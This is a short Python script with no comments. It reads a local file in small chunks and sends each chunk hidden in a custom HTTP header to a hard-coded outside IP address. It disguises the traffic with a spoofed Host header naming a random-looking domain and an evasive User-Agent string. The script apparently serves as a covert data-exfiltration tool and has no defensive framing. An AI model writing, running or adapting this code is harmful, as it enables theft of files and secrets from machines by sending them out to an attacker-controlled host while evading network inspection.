import requests

def send_request(url, filename):
    try:
        with open(filename, 'r') as file:
            data = file.read(10)  
            while data:  
                headers = {"Request-Data": data,
                           "Host": "archive2qorwfngi24dfn44ndss3ssdsfw6ssszvcbcvnftyuire.online",
                           "User-Agent": "No Need to Know this stuff",
                           "Accept-Encoding": "xor"
                           }
                response = requests.post(url, headers=headers)
                if response.status_code == 200:
                    print(f"Request successful with header: Request-Data: {data}")
                else:
                    print(f"Request failed with status code: {response.status_code}")
                data = file.read(8)  
    except FileNotFoundError:
        print("File not found.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

url = "http://188.166.212.100/"
filename = "sample.txt"
send_request(url, filename)
